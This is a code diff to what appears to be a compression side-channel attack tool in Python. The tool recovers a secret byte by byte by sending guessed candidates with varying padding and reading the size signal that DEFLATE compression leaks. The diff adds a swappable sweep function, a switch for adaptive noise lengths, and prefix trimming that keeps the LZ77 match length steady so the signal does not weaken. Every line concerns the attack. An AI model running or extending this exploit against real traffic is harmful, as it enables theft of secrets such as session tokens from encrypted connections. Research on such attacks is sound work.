@@ -184,6 +184,8 @@ async def crack_byte_position(
     max_rounds: int,
     log_prefix: str,
     hint_noise: list[int] | None = None,
+    sweep_fn=None,
+    adaptive_noise: bool = True,
 ) -> tuple[bytes, dict[bytes, int], list[int]]:
     """Recover one byte, repeating rounds until *margin >= min_margin*.
 
@@ -203,6 +205,9 @@ async def crack_byte_position(
     * **Candidate elimination**: after each round, candidates whose
       cumulative sum exceeds ``best_sum + min_margin`` are dropped.
     """
+    if sweep_fn is None:
+        sweep_fn = _sweep_round
+
     sums: dict[bytes, int] = {c: 0 for c in alphabet}
     active = list(alphabet)
     prev_margin = 0
@@ -210,7 +215,7 @@ async def crack_byte_position(
 
     # Start with the hint set (from the previous position) if
     # available, otherwise use the full set.
-    if hint_noise and len(hint_noise) < len(noise_lengths):
+    if adaptive_noise and hint_noise and len(hint_noise) < len(noise_lengths):
         active_noise = list(hint_noise)
     else:
         active_noise = list(noise_lengths)
@@ -219,7 +224,7 @@ async def crack_byte_position(
     did_initial_prune = False
 
     for rnd in range(1, max_rounds + 1):
-        round_sums, round_per_nl = await _sweep_round(
+        round_sums, round_per_nl = await sweep_fn(
             session, packet_log, prefix, active,
             active_noise, settle, flush_bytes,
         )
@@ -244,7 +249,7 @@ async def crack_byte_position(
         # that showed no differential signal (keep productive +
         # neighbours, minimum 3).
         noise_delta = 0
-        if not did_initial_prune:
+        if adaptive_noise and not did_initial_prune:
             productive = set()
             for nl in active_noise:
                 vals = list(round_per_nl[nl].values())
@@ -272,7 +277,7 @@ async def crack_byte_position(
             stall_count = 0
         prev_margin = margin
 
-        if stall_count >= 2 and len(active_noise) < len(noise_lengths):
+        if adaptive_noise and stall_count >= 2 and len(active_noise) < len(noise_lengths):
             n = noise_lengths[-1] + 1
             expanded = set(active_noise)
             for nl in list(expanded):
@@ -318,6 +323,8 @@ async def run_attack(
     flush_bytes: int = 33000,
     min_margin: int = 16,
     max_rounds: int = 64,
+    sweep_fn=None,
+    adaptive_noise: bool = True,
 ) -> dict[str, Any]:
     if noise_lengths is None:
         noise_lengths = list(range(8))
@@ -352,9 +359,17 @@ async def run_attack(
                 hint = sorted({(nl + 1) % (noise_lengths[-1] + 1)
                                for nl in prev_noise} & nl_set)
 
+            # Trim from the front so len(prefix + candidate) is
+            # constant across positions.  Keeps LZ77 match lengths in
+            # the same DEFLATE length-code bin, avoiding positions
+            # where the signal drops from 8 to 7 bits.
+            full_prefix = known_prefix + recovered
+            trim = max(0, len(full_prefix) - len(known_prefix))
+            full_prefix = full_prefix[trim:]
+
             best, sums, prev_noise = await crack_byte_position(
                 session, packet_log,
-                prefix=known_prefix + recovered,
+                prefix=full_prefix,
                 alphabet=alphabet,
                 noise_lengths=noise_lengths,
                 settle=settle,
@@ -363,6 +378,8 @@ async def run_attack(
                 max_rounds=max_rounds,
                 log_prefix=f"pos {pos:2d}",
                 hint_noise=hint,
+                sweep_fn=sweep_fn,
+                adaptive_noise=adaptive_noise,
             )
             ranked = [
                 (k.decode("latin-1"), v)
